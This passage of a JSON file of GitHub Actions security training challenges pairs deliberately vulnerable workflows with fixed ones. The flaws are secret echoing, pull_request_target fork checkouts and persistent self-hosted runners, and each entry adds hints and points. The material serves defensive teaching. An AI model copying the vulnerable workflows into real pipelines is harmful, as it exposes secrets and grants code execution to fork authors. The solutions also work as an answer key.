    "scenario": "# Scenario: Secrets in CI Logs\n\nYour workflow echoes secrets for debugging purposes — `echo ${{ secrets.API_TOKEN }}` to \"verify it's set.\" These logs are stored in GitHub's log storage and are accessible to anyone with Actions read access.\n\nEven after you remove the echo step, the secrets remain in the historical logs. Attackers who gain read access to your repository can extract all secrets that were ever logged.\n\nAdditionally, some steps output sensitive data to stdout/stderr by default (like `npm install` showing auth tokens in verbose mode).\n\n**Your mission:** Remove all secret logging and add `::add-mask::` to mask any sensitive values that must appear in logs.\n\n## Key concepts\n- `::add-mask::VALUE` redacts a value from all subsequent log output\n- Secrets logged once are exposed forever — there's no \"unlog\"\n- Even `echo ${{ secrets.X }}` before the mask leaks the value\n",
    "vulnerableWorkflow": "name: Deploy with Secrets\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Verify credentials\n        run: |\n          echo \"API Token: ${{ secrets.API_TOKEN }}\"\n          echo \"AWS Key: ${{ secrets.AWS_ACCESS_KEY_ID }}\"\n          echo \"DB Password: ${{ secrets.DB_PASSWORD }}\"\n\n      - name: Setup credentials\n        run: |\n          echo \"Setting up AWS credentials...\"\n          export AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}\n          export AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}\n\n      - name: Deploy\n        run: |\n          echo \"Deploying with token ${{ secrets.API_TOKEN }}...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Deploy with Secrets\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Mask secrets\n        run: |\n          echo \"::add-mask::${{ secrets.AWS_ACCESS_KEY_ID }}\"\n          echo \"::add-mask::${{ secrets.AWS_SECRET_ACCESS_KEY }}\"\n\n      - name: Setup credentials\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: |\n          echo \"AWS credentials configured via environment\"\n\n      - name: Deploy\n        env:\n          API_TOKEN: ${{ secrets.API_TOKEN }}\n        run: |\n          echo \"Deploying...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: How secrets leak in logs\n\n`echo ${{ secrets.X }}` directly prints the secret value. Even if you remove it later, the log entry persists. GitHub Actions logs are stored indefinitely and accessible to anyone with repository read access.\n",
      "# Hint 2: The fix\n\nRemove all `echo ${{ secrets.* }}` steps. If you must reference a secret, use `::add-mask::${{ secrets.X }}` FIRST to register it as a mask, then use it. The mask ensures the value is replaced with `***` in all subsequent output.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "pr-target-pwn",
    "title": "Pwn Request",
    "level": "advanced",
    "topic": "github-actions",
    "points": 250,
    "estimatedTime": "30m",
    "description": "This workflow runs on pull_request_target and checks out the fork's code\nbefore running it. Any fork author gets code execution with a write token\nand repository secrets. Stop executing untrusted code in a privileged context.\n",
    "tags": [
      "pwn-request",
      "pull-request-target",
      "checkout"
    ],
    "prerequisites": [
      "script-injection",
      "self-hosted-risk"
    ],
    "objectives": [
      "Explain how pull_request_target plus a fork checkout creates a pwn request",
      "Move untrusted builds to the pull_request event or gate on trusted labels",
      "Verify no fork-controlled ref is checked out or executed with secrets"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Pwn requests and checkout protection guide"
      }
    ],
    "scenario": "# Scenario: Pwn Request\r\n\r\nYour workflow triggers on `pull_request_target` so it can label PRs and post\r\nresults. To test the actual PR code, it checks out the fork's head commit —\r\nthen runs `npm ci` and `npm test` on it.\r\n\r\nThat combination is a **pwn request**: `pull_request_target` runs in the base\r\nrepository context with a write token and access to secrets, but the code it\r\nexecutes comes from the untrusted fork. Any fork author can run arbitrary code\r\nwith your secrets by opening a PR.\r\n\r\nSince June 2026 `actions/checkout` v7 refuses fork checkouts under\r\n`pull_request_target` by default — but older pins and manual `git fetch`\r\npatterns stay exploitable, and the design flaw remains yours to fix.\r\n\r\n**Your mission:** Stop executing fork code in the privileged context. Run\r\nuntrusted builds under the `pull_request` event instead.\r\n\r\n## Key concepts\r\n- `pull_request_target` = base code, write token, secrets available\r\n- `pull_request` (from forks) = fork code, read-only token, no secrets\r\n- Checking out `head.sha` or `pull/N/merge` under the target event crosses the trust boundary\r\n",
    "vulnerableWorkflow": "name: PR Check\r\n\r\non:\r\n  pull_request_target:\r\n    types: [opened, synchronize]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  test:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n        with:\r\n          repository: ${{ github.event.pull_request.head.repo.full_name }}\r\n          ref: ${{ github.event.pull_request.head.sha }}\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Run tests\r\n        run: npm test\r\n",
    "solutionWorkflow": "name: PR Check\r\n\r\non:\r\n  pull_request:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  test:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Run tests\r\n        run: npm test\r\n",
    "hints": [
      "# Hint 1: Who runs what\r\n\r\n`pull_request_target` checks out your **base** branch by default and hands the\r\njob a write token plus secrets. The `with: repository/ref` override swaps in\r\nthe **fork's** code — so `npm ci` and `npm test` now execute attacker code\r\nwith your privileges.\r\n",
      "# Hint 2: The fix\r\n\r\nRun tests under the `pull_request` event with a plain checkout — fork builds\r\nget a read-only token and no secrets. Reserve `pull_request_target` for\r\nmetadata-only work, or gate it on a maintainer-added `safe-to-test` label.\r\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "slsa-provenance",
    "title": "Prove the Build",
    "level": "advanced",
    "topic": "github-actions",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This release workflow publishes artifacts with no provenance and no SBOM.\nConsumers cannot tell whether the artifact came from your pipeline or an\nimpostor. Attest the build and document its dependencies.\n",
    "tags": [
      "slsa",
      "provenance",
      "sbom",
      "release"
    ],
    "prerequisites": [
      "artifact-tampering",
      "supply-chain-attack"
    ],
    "objectives": [
      "Explain what signed provenance guarantees to artifact consumers",
      "Add an attestation step with subject path and OIDC permissions",
      "Generate an SBOM alongside provenance for dependency visibility"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Provenance and SBOM guide"
      }
    ],
    "scenario": "# Scenario: Prove the Build\r\n\r\nYour release pipeline builds `dist/`, uploads it, and publishes to npm. It\r\nworks — but nothing proves the published bytes came from this pipeline. An\r\nattacker who compromises a maintainer account, a registry, or any step between\r\nbuild and publish can substitute artifacts, and consumers have no way to tell.\r\n\r\nSigned build provenance fixes that: an attestation binds each artifact to the\r\nexact repository, commit, and workflow that produced it, signed keylessly via\r\nOIDC. An SBOM alongside it documents every dependency inside, so vulnerable\r\nlibraries are visible instead of hidden.\r\n\r\n**Your mission:** Attest the built artifact and generate an SBOM in the\r\nrelease workflow.\r\n\r\n## Key concepts\r\n- Attestations bind artifacts to source, commit, and build (SLSA provenance)\r\n- `actions/attest` needs `id-token: write` plus `attestations: write`\r\n- `anchore/sbom-action` documents dependencies as SPDX\r\n",
    "vulnerableWorkflow": "name: Release\r\n\r\non:\r\n  release:\r\n    types: [published]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n      - name: Upload artifact\r\n        uses: actions/upload-artifact@v4\r\n        with:\r\n          name: dist\r\n          path: dist/\r\n\r\n  publish:\r\n    runs-on: ubuntu-latest\r\n    needs: build\r\n    steps:\r\n      - name: Download artifact\r\n        uses: actions/download-artifact@v4\r\n        with:\r\n          name: dist\r\n          path: dist/\r\n\r\n      - name: Publish to npm\r\n        run: npm publish --access public\r\n        env:\r\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\r\n",
    "solutionWorkflow": "name: Release\r\n\r\non:\r\n  release:\r\n    types: [published]\r\n\r\npermissions:\r\n  contents: read\r\n  id-token: write\r\n  attestations: write\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n      - name: Upload artifact\r\n        uses: actions/upload-artifact@v4\r\n        with:\r\n          name: dist\r\n          path: dist/\r\n\r\n  publish:\r\n    runs-on: ubuntu-latest\r\n    needs: build\r\n    steps:\r\n      - name: Download artifact\r\n        uses: actions/download-artifact@v4\r\n        with:\r\n          name: dist\r\n          path: dist/\r\n\r\n      - name: Generate SBOM\r\n        uses: anchore/sbom-action@v0\r\n\r\n      - name: Attest build provenance\r\n        uses: actions/attest@v4\r\n        with:\r\n          subject-path: 'dist/**'\r\n\r\n      - name: Publish to npm\r\n        run: npm publish --access public\r\n        env:\r\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\r\n",
    "hints": [
      "# Hint 1: What is missing\r\n\r\nThe workflow builds and publishes, but no step vouches for the artifact.\r\nLook for `actions/attest` (or the older `attest-build-provenance`) and any\r\nSBOM generation — neither exists, so consumers trust the bytes blindly.\r\n",
      "# Hint 2: The fix\r\n\r\nAdd `actions/attest@v4` with `subject-path: 'dist/**'` after the download,\r\nplus `id-token: write` and `attestations: write` permissions. Add\r\n`anchore/sbom-action@v0` so dependencies are documented too.\r\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "runner-ghost",
    "title": "Runner Ghost",
    "level": "advanced",
    "topic": "github-actions",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This PR workflow runs untrusted code on a persistent self-hosted runner with\ndefault checkout settings. Tokens and workspace files from earlier jobs haunt\nevery later run. Stop credentials from surviving the job.\n",
    "tags": [
      "self-hosted",
      "runners",
      "persistence"
    ],
    "prerequisites": [
      "self-hosted-risk"
    ],
    "objectives": [
      "Explain how checkout credentials and workspaces persist on non-ephemeral runners",
      "Set persist-credentials false where no push is needed and isolate untrusted jobs",
      "Verify no token survives the job on shared runners"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Self-hosted runner isolation guide"
      }
    ],
    "scenario": "# Scenario: Runner Ghost\n\nYour pull-request workflow runs on a persistent self-hosted runner for speed.\nThe checkout step uses defaults — which means `persist-credentials: true` —\nso the job token is written into `.git/config` in the workspace. The workspace\nitself is never wiped between jobs either.\n\nThose leftovers haunt every later run on that host: files, credentials, even\nprocesses from earlier jobs are still there when the next PR — possibly from a\nstranger's fork — starts executing. One malicious PR harvests the previous\njob's token and the haunting continues.\n\n**Your mission:** Stop credentials from surviving the job. Disable credential\npersistence where no push is needed, and keep untrusted work off persistent\nrunners.\n\n## Key concepts\n- Checkout persists the token to disk unless told otherwise\n- Persistent runners share filesystem state across jobs and trust levels\n- Ephemeral single-job runners (or containers) leave no ghost behind\n",
    "vulnerableWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  pr-build:\n    runs-on: [self-hosted, linux]\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run PR tests\n        run: npm test\n",
    "solutionWorkflow": "name: PR Build\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  pr-build:\n    runs-on: [self-hosted, linux]\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: false\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run PR tests\n        run: npm test\n",
    "hints": [
      "# Hint 1: Defaults that haunt\n\n`actions/checkout` stores credentials in `.git/config` unless\n`persist-credentials: false` is set. On a persistent `self-hosted` runner\nthat file — and the whole `_work` directory — is still there when the next\njob starts.\n",
      "# Hint 2: The fix\n\nAdd `with: persist-credentials: false` to checkouts that never push, and move\nuntrusted PR work to ephemeral runners or containers so nothing survives\nbetween jobs.\n"
    ],
    "hintsPenalty": 50
  }
];
